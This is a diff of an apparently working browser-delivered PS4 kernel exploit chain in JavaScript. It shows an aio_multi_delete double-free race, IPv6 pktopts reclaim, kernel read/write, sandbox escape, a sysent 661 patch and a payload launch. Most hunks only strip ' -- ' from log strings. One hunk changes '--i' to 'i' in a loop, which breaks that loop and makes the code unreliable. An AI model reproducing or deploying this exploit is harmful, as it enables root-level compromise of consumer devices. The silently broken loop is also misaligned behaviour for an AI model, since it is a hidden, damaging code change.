@@ -20,7 +20,7 @@ function post(tag, detail) {
 const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
 
 const PROSE = [
-    / -- /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
+    / /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
     /,\s+\w+\s+of\s+which\s/,
     /\s+(because|rather than|instead of|so that|which is|which means|which the|so the|with the aim)\s/,
     /\s+so\s+[a-z]/,
@@ -207,7 +207,7 @@ function makeRpc(worker) {
         const fwResolved = offsetsFor(navigator.userAgent);
         const fwKey = fwResolved.key;
         // off.kpatch wins when a firmware shares another's kernel and therefore
-        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
+        // its blob 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = fwResolved.off && fwResolved.off.kpatch
             ? "patches/" + fwResolved.off.kpatch
             : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
@@ -236,8 +236,8 @@ function makeRpc(worker) {
                 + "   " + KPATCH_JMP_SITES.length + " gateable jump site(s): "
                 + KPATCH_JMP_SITES.slice(0, 12)
                     .map(function (v) { return "0x" + v.toString(16); }).join(" ")
-            : (kpatchName ? "NOT LOADED (" + kpatchName + ") -- stage 9 will not run"
-                          : "no firmware key, so no blob name -- stage 9 will not run"));
+            : (kpatchName ? "NOT LOADED (" + kpatchName + ") stage 9 will not run"
+                          : "no firmware key, so no blob name stage 9 will not run"));
 
         let payload = null;
         try {
@@ -250,7 +250,7 @@ function makeRpc(worker) {
             ? "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12))
                 + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
                                        : " entry=NOT-e9")
-            : "NOT LOADED -- stage 10 will not run");
+            : "NOT LOADED stage 10 will not run");
 
         const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
         const SPRAY_NUM = params.has("spray")
@@ -277,13 +277,13 @@ function makeRpc(worker) {
         mark("FW", key || "(not a PS4 UA)");
         if (!off) { state("no offsets for this firmware", "bad"); return; }
 
-        mark("FW-STATUS", key + " -- " + (off.fw_status
+        mark("FW-STATUS", key + " " + (off.fw_status
             || "no status recorded in the offsets block."));
         mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
             + (STOP_PRECOMMIT
-                ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
+                ? " ?stop=precommit: the second aio_multi_delete WILL BE "
                   + "WITHHELD. Nothing is freed twice and no reboot is owed."
-                : "  -- ARMED: the worker issues a REAL aio_multi_delete"));
+                : " ARMED: the worker issues a REAL aio_multi_delete"));
 
         state("🔄 أنتظر رجاءاً...", "warn");
 
@@ -702,7 +702,7 @@ function makeRpc(worker) {
         if (!markerCell || !ptrish(markerCell)) {
             check("walk-reached-worker-marker", false,
                 "storage=" + storage + " cell=" + markerCell);
-            state("walk failed -- run step 4b for the dump", "bad"); return;
+            state("walk failed run step 4b for the dump", "bad"); return;
         }
         const butterfly = p.read8(markerCell.add32(8));
         let wMaster = null, wVictim = null, wLeak = null;
@@ -856,7 +856,7 @@ function makeRpc(worker) {
                 + (pipeAt ? "" : "  (no mov rax,42 found)"));
             check("fcntlf_setfl-o_nonblock-succeeded-four-pipe",
                 fcntlRc.length === 4 && fcntlRc.every(function (r) { return r === 0; }),
-                "returns {" + fcntlRc + "} -- -1 on any of them and the "
+                "returns {" + fcntlRc + "} -1 on any of them and the "
                 + "reference's KernelView constructor throws");
             check("third-pipe-exists-carry-ar2_file", leakPipeOk,
                 leakPipeOk ? "leak " + leakPipe
@@ -887,11 +887,11 @@ function makeRpc(worker) {
             } else {
                 mark("WIDEN", "one " + wideLen + " byte write per attempt, peer "
                     + "receive buffer " + PEER_RCVBUF
-                    + " -- soclose should hold for l_linger (1 s), against the "
+                    + " soclose should hold for l_linger (1 s), against the "
                     + "0.3 ms an idle close takes");
             }
         } else {
-            mark("WIDEN-OFF", "?wide=0 -- running the old microsecond window");
+            mark("WIDEN-OFF", "?wide=0 running the old microsecond window");
         }
 
         const WHICH = NUM_REQS - 1;
@@ -936,7 +936,7 @@ function makeRpc(worker) {
             + "  affinity main=" + ma + " worker=" + wa);
         if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
             mark("REFUSING-TO-ARM", "reason=core-pin-failed");
-            state("could not pin -- refusing to arm", "bad");
+            state("could not pin refusing to arm", "bad");
             mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -993,7 +993,7 @@ function makeRpc(worker) {
             ipv6Socks.length + "/" + IPV6_SOCK_NUM
             + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
         if (ipv6Socks.length !== IPV6_SOCK_NUM) {
-            state("cannot stand up the reclaim -- refusing to arm", "bad");
+            state("cannot stand up the reclaim refusing to arm", "bad");
             mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
             mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
@@ -1034,7 +1034,7 @@ function makeRpc(worker) {
 
         state("🔄 أنتظر رجاءاً...", "warn");
         mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
-            + "  -- the worker now issues a REAL aio_multi_delete");
+            + " the worker now issues a REAL aio_multi_delete");
 
         let won = false, confirmed = false, twins = null;
         let attemptsUsed = 0, detectorFired = 0;
@@ -1246,12 +1246,12 @@ function makeRpc(worker) {
         mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
             + "detector fired " + detectorFired + " time(s): " + realFrees
             + " real double free(s), " + benignHits + " harmless misfire(s)");
-        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
+        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected "
             + "closed descriptors were still listed in the socket pool");
         mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
             + " steps on average, worst " + probeMax + " of " + PROBE_CAP
             + ", " + resuspendFail + " re-suspend failures"
-            + "   -- pinned at the cap means raise ?probes=");
+            + " pinned at the cap means raise ?probes=");
         mark("DETECTOR", STRICT_TCP
             ? "poll_err+tcp_state+worker_in_delete"
             : "poll_err+worker_in_delete (tcp_state=report-only)");
@@ -1265,16 +1265,16 @@ function makeRpc(worker) {
             + suspendFail + " suspend refused");
         mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
             + (inWindowSeen + tooLateSeen)
-            + "   -- with the worker frozen this should be near 1.0, unlike the "
+            + " with the worker frozen this should be near 1.0, unlike the "
             + "0.33% a spacer could reach");
         if (misfireCap)
             mark("MISFIRE-CAP", benignHits + " detector hits produced no clean double "
                 + "free, so the loop stopped instead of racing on. the timing is "
-                + "off -- try a different ?spacer= before spending another boot.");
+                + "off try a different ?spacer= before spending another boot.");
         if (reclaimFailed)
             mark("RECLAIM-FAILED", "a real double free could not be reclaimed. "
                 + "the loop stopped rather than free more chunks it cannot "
-                + "account for. this chunk is dangling -- reboot.");
+                + "account for. this chunk is dangling reboot.");
         if (detectorFired) {
             mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
                 + " tcp_state=" + lastTcp
@@ -1338,7 +1338,7 @@ function makeRpc(worker) {
                     const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
                     mark("SCHED-RELEASED", "affinity=" + ar + " back to "
                         + savedMask + ", rtprio=" + pr + " back to {"
-                        + savedPrio + "} -- stage 2 must not run realtime on "
+                        + savedPrio + "} stage 2 must not run realtime on "
                         + "one core");
                 }
 
@@ -1478,12 +1478,12 @@ function makeRpc(worker) {
                 const leakFp = lk8(reqs2Base + AR2_FILE);
                 if (kptr(leakFp)) kLeakFp = leakFp;
                 mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
-                    ? "  -- leak pipe's struct file, good for the whole run"
-                    : "  -- NOT a kernel pointer, so stage 4 falls back to "
+                    ? " leak pipe's struct file, good for the whole run"
+                    : " NOT a kernel pointer, so stage 4 falls back to "
                     + "aio_info+8 exactly as before"));
                 mark("LEAK-ENTRY-INDEX", "window entry "
                     + (reqs2Base / AIO_ENTRY_SIZE)
-                    + " -- correlate this with whether curproc works: if the "
+                    + " correlate this with whether curproc works: if the "
                     + "aio_info route only ever succeeds for one particular "
                     + "index, that confirms ar2_info is per-entry");
 
@@ -1503,7 +1503,7 @@ function makeRpc(worker) {
 
                     if (gr !== 0x800) {
                         mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
-                            + " getsockopt returned " + gr + ", expected 2048 -- "
+                            + " getsockopt returned " + gr + ", expected 2048 "
                             + "the confused evf no longer controls ip6r0_len");
                         break;
                     }
@@ -1654,7 +1654,7 @@ function makeRpc(worker) {
                 targetIds.dv.setUint32(4, targetId, true);
                 sc(SYS.aio_multi_poll, targetIds.addr.add32(4), 1, outs.addr);
                 mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
-                    + hx(targetId) + " -- both deletes now free the same 0x100 "
+                    + hx(targetId) + " both deletes now free the same 0x100 "
                     + "allocation");
 
                 committed2 = true;
@@ -1668,7 +1668,7 @@ function makeRpc(worker) {
                     mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
                         + delMs + " ms. Normal is under 100. The 0x100 chunk has "
                         + "been free and unclaimed for that whole time, so the "
-                        + "reclaim below is likely to fail -- and if it does, "
+                        + "reclaim below is likely to fail and if it does, "
                         + "that is the reason, not the spray.");
 
                 let ptwins = null;
@@ -1711,14 +1711,14 @@ function makeRpc(worker) {
                     derr0 === 0 && derr1 === 0, hx(derr0) + "," + hx(derr1));
                 if (ptwins && ptwins.a === ptwins.b) {
                     mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
-                        + " -- that is one socket seen twice, not an aliased "
+                        + " that is one socket seen twice, not an aliased "
                         + "allocation. refusing to build a read primitive on it.");
                     ptwins = null;
                 }
                 if (!check("0x100-chunk-reclaimed-pktopts", !!ptwins,
                         ptwins ? ("pktopts twins are fds " + ptwins.a + " and "
                                   + ptwins.b + " after " + ptwins.round + " round(s)")
-                               : "no pktopts twins found -- the 0x100 chunk is "
+                               : "no pktopts twins found the 0x100 chunk is "
                                  + "dangling, reboot now"))
                     return false;
 
@@ -1896,7 +1896,7 @@ function makeRpc(worker) {
                                 ok ? "p_pid matches getpid(), so this is curproc "
                                     + "-- with no aio_info anywhere in the path"
                                     : "p_pid " + (pid2 ? pid2.low : "?")
-                                    + " -- rejected");
+                                    + " rejected");
                             if (ok) { curproc = cand; curprocFrom = "sigio"; }
                         }
                     }
@@ -1913,7 +1913,7 @@ function makeRpc(worker) {
                 mark("KREAD-CURPROC", "aio_info+8 = "
                     + (aioCurproc ? aioCurproc.toString() : "FAILED")
                     + (aioCurproc && kptr(aioCurproc) ? "  (kernel pointer)"
-                        : "  (NOT a kernel pointer -- ar2_info was reclaimed)"));
+                        : "  (NOT a kernel pointer ar2_info was reclaimed)"));
                 if (aioCurproc && kptr(aioCurproc) && !curproc) {
                     curproc = aioCurproc; curprocFrom = "aio_info";
                 }
@@ -2001,7 +2001,7 @@ function makeRpc(worker) {
                 } else {
                     mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
                         + "walk cannot run. That walk is only needed for the "
-                        + "PIPE route to fast R/W -- the write primitive below "
+                        + "PIPE route to fast R/W the write primitive below "
                         + "comes out of ip6po_pktinfo and needs none of it.");
                 }
 
@@ -2029,7 +2029,7 @@ function makeRpc(worker) {
                     + "gives " + (seen || "null") + ", target held " + (before || "?"));
                 check("write-pointer-landed-where-aimed", aimOk,
                     aimOk ? "" : "getsockopt(IPV6_PKTINFO) does not match an "
-                        + "independent kread8 of the target -- NOT writing");
+                        + "independent kread8 of the target NOT writing");
 
                 if (!aimOk) {
 
@@ -2071,7 +2071,7 @@ function makeRpc(worker) {
                     check("ip6po_pktinfo-not-left-interior",
                         kstr2 === "evf cv",
                         "a dangling interior pointer here is a free() of a "
-                        + "non-allocation at teardown -- that is what panicked "
+                        + "non-allocation at teardown that is what panicked "
                         + "the last run");
 
                     if (wroteOk && kstr2 === "evf cv")
@@ -2093,7 +2093,7 @@ function makeRpc(worker) {
                 if (KSTR_RESIDUE !== 0x26f)
                     mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
                         + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
-                        + " -- the constraint may not hold, treat the result "
+                        + " the constraint may not hold, treat the result "
                         + "with suspicion");
 
                 let first = KSTR_LO;
@@ -2111,7 +2111,7 @@ function makeRpc(worker) {
                 }
                 mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
                     + (lastRead || "null")
-                    + (kstrOff >= 0 ? "" : " -- no ELF header found"));
+                    + (kstrOff >= 0 ? "" : " no ELF header found"));
 
                 if (kstrOff >= 0) {
 
@@ -2133,7 +2133,7 @@ function makeRpc(worker) {
                             + ")   residue 0x" + (kstrOff & 0x3fff).toString(16));
                         mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
                             + "0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree "
-                            + "0x7f6f27 -- this one is 0x" + kstrOff.toString(16));
+                            + "0x7f6f27 this one is 0x" + kstrOff.toString(16));
                         check("off_kstr for " + key + " recovered", true,
                             "0x" + kstrOff.toString(16)
                             + (off.k_evf_cv !== undefined
@@ -2144,7 +2144,7 @@ function makeRpc(worker) {
                     }
                 } else {
                     check("off_kstr for " + key + " recovered", false,
-                        "no ELF header in the window -- either it is not mapped "
+                        "no ELF header in the window either it is not mapped "
                         + "or off_kstr is outside 0x" + KSTR_LO.toString(16)
                         + "..0x" + KSTR_HI.toString(16)
                         + ". Widen with ?kstrlo=&kstrhi= only after deciding "
@@ -2243,7 +2243,7 @@ function makeRpc(worker) {
 
                             if (shaped) {
 
-                                for (let i = openFds.length - 1; i >= 0; --i)
+                                for (let i = openFds.length - 1; i >= 0; i)
                                     if (openFds[i] === masterPipe[0]
                                         || openFds[i] === masterPipe[1]
                                         || openFds[i] === slavePipe[0]
@@ -2251,7 +2251,7 @@ function makeRpc(worker) {
                                         openFds.splice(i, 1);
                                 mark("PIPES-PINNED", "master " + masterPipe
                                     + " and slave " + slavePipe + " taken off "
-                                    + "the cleanup list -- closing master would "
+                                    + "the cleanup list closing master would "
                                     + "kmem_free slave's struct pipe");
 
                                 state("🔄 أنتظر رجاءاً...", "warn");
@@ -2555,7 +2555,7 @@ function makeRpc(worker) {
                                 check("master-pipe-drained-between-flushes",
                                     mCnt === 0 && mIn === 0 && mOut === 0,
                                     "cnt=" + mCnt + " in=" + mIn + " out=" + mOut
-                                    + " -- anything else and flush() is walking "
+                                    + " anything else and flush() is walking "
                                     + "forward, which the pre-flight said it "
                                     + "does not");
 
@@ -2620,7 +2620,7 @@ function makeRpc(worker) {
                                     + "read back by the KERNEL, not by us",
                                     tcSock1 === KV_WITNESS,
                                     "getsockopt(IPV6_TCLASS) returned "
-                                    + hx(tcSock1) + " -- this is the proof that "
+                                    + hx(tcSock1) + " this is the proof that "
                                     + "the write reached real kernel memory");
                                 check("kv-reads-write", tcKv1 === KV_WITNESS,
                                     hx(tcKv1));
@@ -2793,7 +2793,7 @@ function makeRpc(worker) {
                                 if (!canRepair) {
                                     mark("REPAIR-REFUSED", "the repair was NOT "
                                         + "attempted. Nothing was written and nothing "
-                                        + "will be closed -- an unverified repair is "
+                                        + "will be closed an unverified repair is "
                                         + "worse than none, because it turns a known "
                                         + "reboot into an unknown one.");
                                 } else {
@@ -2829,7 +2829,7 @@ function makeRpc(worker) {
                                     mark("PIPE-REFCNT", holdLog.join("  "));
                                     check("four-pipe-files-hold"
                                         + "reference", held === 4,
-                                        held + "/4 -- without this, closing the master "
+                                        held + "/4 without this, closing the master "
                                         + "pipe kmem_frees slave's struct pipe, and "
                                         + "closing the slave frees whatever address its "
                                         + "pipebuf last pointed at");
@@ -2842,7 +2842,7 @@ function makeRpc(worker) {
                                             ? "so 0x28 is f_count. The slave pair reads "
                                             + "high because kv's own read(slave[0]) and "
                                             + "write(slave[1]) hold it while they work."
-                                            : holdLog.join(" ") + " -- if these are not "
+                                            : holdLog.join(" ") + " if these are not "
                                             + "small reference counts, 0x28 is the wrong "
                                             + "field and the hold is corrupting "
                                             + "something else");
@@ -2884,7 +2884,7 @@ function makeRpc(worker) {
                                     }
                                     check("aliased-pktopts-entirely-zero"
                                         + "except its tclass", leftover === 0,
-                                        leftover + " non-zero word(s) left -- head "
+                                        leftover + " non-zero word(s) left head "
                                         + hexBytes(chunkX.u8.subarray(0, 16)));
 
                                     repaired = held === 4 && cleared && leftover === 0;
@@ -2976,7 +2976,7 @@ function makeRpc(worker) {
                                         + "one the sigio named",
                                         !!selfProc && sameI64(selfProc, curproc),
                                         selfProc ? selfProc + " vs " + curproc
-                                            : "not found -- allproc or p_pid is wrong");
+                                            : "not found allproc or p_pid is wrong");
                                     check("pfind-found-kernel-proc-pid",
                                         !!kProc && kptr(kProc),
                                         kProc ? kProc.toString() : "not found");
@@ -3090,7 +3090,7 @@ function makeRpc(worker) {
                                                 + "opens now", escaped,
                                                 escaped ? "fd_rdir/fd_jdir now point at "
                                                     + "the kernel's root vnode"
-                                                    : "no probe path changed -- the app "
+                                                    : "no probe path changed the app "
                                                     + "sandbox may already have allowed "
                                                     + "all of them, so this proves "
                                                     + "nothing either way");
@@ -3142,10 +3142,10 @@ function makeRpc(worker) {
                                             + "args[0], which is the address we pass "
                                             + "to kexec"
                                             : wouldExecArgs
-                                            ? "REFUSING -- this is ff e6, `jmp rsi`, "
+                                            ? "REFUSING this is ff e6, `jmp rsi`, "
                                             + "which would execute the argument array "
                                             + "itself rather than jump through it"
-                                            : "REFUSING -- a wrong sy_call is a panic "
+                                            : "REFUSING a wrong sy_call is a panic "
                                             + "on the next syscall 661");
 
                                     const syNarg = kview(sysent).getUint32(0, true);
@@ -3159,7 +3159,7 @@ function makeRpc(worker) {
                                         sysentOk, sysentOk
                                             ? "sy_call points into the kernel image and "
                                             + "sy_narg is a plausible argument count"
-                                            : "REFUSING -- this is not sysent, and "
+                                            : "REFUSING this is not sysent, and "
                                             + "writing here would corrupt something else");
 
                                     const site = alloc(8);
@@ -3185,7 +3185,7 @@ function makeRpc(worker) {
                                         sitesOk ? "so the blob was built for this kernel "
                                             + "and kbase agrees with the LSTAR-0x1c0 the "
                                             + "blob will compute for itself"
-                                            : "REFUSING -- " + siteBad.join(" "));
+                                            : "REFUSING " + siteBad.join(" "));
 
                                     if (!(gadgetOk && sysentOk && sitesOk)) {
                                         mark("KPATCH-REFUSED", "one of the three gates "
@@ -3242,7 +3242,7 @@ function makeRpc(worker) {
                                                 + "byte", copied, "");
 
                                             if (copied && params.get("patch") === "0") {
-                                                mark("KEXEC-WITHHELD", "?patch=0 -- "
+                                                mark("KEXEC-WITHHELD", "?patch=0 "
                                                     + "sysent was NOT modified and the "
                                                     + "blob was NOT executed. Everything "
                                                     + "up to that point is proven above.");
@@ -3276,7 +3276,7 @@ function makeRpc(worker) {
                                                 check("sysent661-put"
                                                     + "as it was", restored,
                                                     restored ? "" : "sy_call is still the "
-                                                        + "gadget -- do not call 661");
+                                                        + "gadget do not call 661");
                                                 check("blob-ran-ring-0"
                                                     + "returned 0", kexecRet === 0,
                                                     "kexec returned " + kexecRet);
@@ -3299,7 +3299,7 @@ function makeRpc(worker) {
                                                     + "read back out of live kernel "
                                                     + "memory", patchedOk,
                                                     patchedOk ? "the kernel's own text "
-                                                        + "changed under us -- that is "
+                                                        + "changed under us that is "
                                                         + "the patch, and nothing in "
                                                         + "userland could have done it"
                                                         : "still conditional: "
@@ -3452,7 +3452,7 @@ function makeRpc(worker) {
                                                 + off.k_pthread_create.toString(16)
                                                 + " = " + expect
                                                 + (agree ? "   AGREE" : "   DISAGREE"
-                                                    + " -- not using it"));
+                                                    + " not using it"));
                                             if (agree) {
                                                 target = expect;
                                                 how = "offsets table, GOT slot "
@@ -3464,7 +3464,7 @@ function makeRpc(worker) {
                                         const forced = params.get("forcepthread") === "1";
                                         check("pthread_create was identified",
                                             !!target,
-                                            target ? how + " -- calling it"
+                                            target ? how + " calling it"
                                                 : "neither a thunk nor a prologue. The "
                                                 + "payload stays mapped at " + entry
                                                 + " and is NOT launched. Read "
@@ -3473,7 +3473,7 @@ function makeRpc(worker) {
 
                                         if (!target && forced) {
                                             target = cand; how = "forced";
-                                            mark("PTHREAD-FORCED", "?forcepthread=1 -- "
+                                            mark("PTHREAD-FORCED", "?forcepthread=1 "
                                                 + "calling " + cand + " anyway");
                                         }
 
@@ -3533,7 +3533,7 @@ function makeRpc(worker) {
                                 + "the kernel R/W proofs above still stand.");
                         }
                 } else {
-                    mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
+                    mark("FASTRW-SKIPPED", "no pipe struct addresses curproc "
                         + "was unavailable, so the ofiles walk never ran and "
                         + "there is nothing to aim the pipebuf at");
                 }
@@ -3566,13 +3566,13 @@ function makeRpc(worker) {
                 ? "karw=1 repair=0 root=0"
                 : "doublefree=1 reclaim=1 karw=pktopts kv=0");
 
-            state(repaired ? "REPAIRED -- tearing down..."
-                : kv ? "KERNELVIEW LIVE -- REBOOT"
-                     : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
+            state(repaired ? "REPAIRED tearing down..."
+                : kv ? "KERNELVIEW LIVE REBOOT"
+                     : "DOUBLE FREE ACHIEVED REBOOT", "warn");
             if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
                 + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
         } else if (committed) {
-            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
+            state("FREED BUT NOT RECLAIMED REBOOT NOW", "bad");
         } else if (failCount === 0) {
             state("no win in " + attemptsUsed + " attempts", "warn");
         } else {
@@ -3582,7 +3582,7 @@ function makeRpc(worker) {
     } catch (e) {
         mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
         mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
-        state("FAILED -- see log", "bad");
+        state("FAILED see log", "bad");
     } finally {
 
         const teardown = !committed || repaired;
@@ -3731,7 +3731,7 @@ function makeRpc(worker) {
                     "affinity set=" + ar + " reads " + backMask
                     + "   rtprio set=" + pr + " reads {" + backPrio + "}"
                     + "   wanted " + savedMask + " {" + savedPrio + "}"
-                    + (good ? "  ok" : "  MISMATCH -- the next page load will "
+                    + (good ? "  ok" : "  MISMATCH the next page load will "
                        + "run on a mis-scheduled main thread"));
             }
         } catch (e) {
@@ -3760,7 +3760,7 @@ function makeRpc(worker) {
             if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
                 window.p.write8(mainPivotAddr, mainSavedCell);
                 cellCorrupted = false;
-                mark("JSCELL-RESTORED", "late -- the window was left open");
+                mark("JSCELL-RESTORED", "late the window was left open");
             }
         } catch (e) { }
         try {
@@ -3798,7 +3798,7 @@ function makeRpc(worker) {
             mark("STEP-4Q-DONE", payloadRunning
                 ? "chain=complete leftovers=none"
                 : kpatched
-                ? "repaired, torn down, root, kernel patched -- but the payload "
+                ? "repaired, torn down, root, kernel patched but the payload "
                   + "did not start. It is mapped and verified; only the launch "
                   + "is missing."
                 : "the corrupted context is repaired and the environment is "
@@ -3807,9 +3807,9 @@ function makeRpc(worker) {
             try {
                 stateEl.textContent = payloadRunning
                     ? "ALL DONE"
-                    : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
-                    : jailbroken ? "ROOT -- NO REBOOT NEEDED"
-                    : "REPAIRED -- NO REBOOT NEEDED";
+                    : kpatched ? "ROOT + KERNEL PATCHED NO REBOOT"
+                    : jailbroken ? "ROOT NO REBOOT NEEDED"
+                    : "REPAIRED NO REBOOT NEEDED";
                 stateEl.className = "ok";
             } catch (e) { }
         }
